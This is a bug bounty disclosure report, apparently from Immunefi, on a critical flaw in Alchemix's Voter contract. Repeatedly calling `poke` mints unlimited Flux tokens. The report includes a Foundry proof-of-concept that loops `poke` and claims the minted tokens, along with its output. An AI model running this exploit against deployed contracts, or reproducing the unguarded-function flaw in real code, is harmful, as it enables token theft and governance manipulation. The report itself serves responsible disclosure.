# 31222 - \[SC - Critical] Unlimited Flux minting

Submitted on May 15th 2024 at 04:01:45 UTC by @Tapir49939 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31222

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Vulnerability Details

The attacker can mint unlimited amount of Flux tokens.

The `vote` and `reset` functions of the `Voter` contract could be called only once in an Epoch. Therefore, the amount of Flux tokens minted is limited.

```
function reset(uint256 _tokenId) public onlyNewEpoch(_tokenId) {
    if (msg.sender != admin) {
        require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
    }

    lastVoted[_tokenId] = block.timestamp;
    _reset(_tokenId);
    IVotingEscrow(veALCX).abstain(_tokenId);
    IFluxToken(FLUX).accrueFlux(_tokenId);  // Accrue Flux once in an Epoch, onlyNewEpoch modifier enforces this!
}
```

However, the `poke` function lacks such limitations and `onlyNewEpoch` modifier, and could be called any number of times. Poke calls `_vote` internal functions that accrues Flux.

```
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
    _reset(_tokenId);

    uint256 _poolCnt = _poolVote.length;
    uint256 _totalVoteWeight = 0;
    uint256 _totalWeight = 0;

    for (uint256 i = 0; i < _poolCnt; i++) {
        _totalVoteWeight += _weights[i];
    }

    IFluxToken(FLUX).accrueFlux(_tokenId);  // Accrue Flux unlimited number of times through poke!!!
    ...
}
```

The attack scenario is simple:

1. Vote for a pool.
2. Keep calling `poke` in a loop, Flux will be minted.

## Impact Details

Consequences are dire:

1. Flux token has a market value.
2. Flux token could be used to boost the voting power.

## Proof of Concept

Run the test as: `forge test --mp src/test/Boost.t.sol --fork-url 'https://...' -vv`

```
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract Boost is BaseTest {
    function setUp() public {
        setupContracts(block.timestamp);
    }

    function testFluxUnlimitedMint() public {
        address attacker = address(456);

        uint256 tokenId = createVeAlcx(attacker, 10e18, MAXTIME, false);

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        assertEq(flux.getUnclaimedFlux(tokenId), 0);

        hevm.prank(attacker);
        voter.vote(tokenId, pools, weights, 0);

        uint256 unclaimedBalance1 = flux.getUnclaimedFlux(tokenId);

        // Here the attacker mints Flux
        // increase/decrease loop bound to see the varing amount of Flux
        hevm.startPrank(attacker);
        for (uint i; i < 10000; i++) {
            voter.poke(tokenId);
        }
        hevm.stopPrank();

        uint256 unclaimedBalance2 = flux.getUnclaimedFlux(tokenId);

        assertGt(unclaimedBalance2, unclaimedBalance1);
        
        console.log("Flux balance = %s", unclaimedBalance2);

        hevm.startPrank(attacker);
        flux.claimFlux(tokenId, unclaimedBalance2);
    }
}
```

Output:

```
Flux balance = 98165526504584473482437      // For 10000 iterations
Flux balance = 196321237438075597852437     // For 20000 iterations
...
```
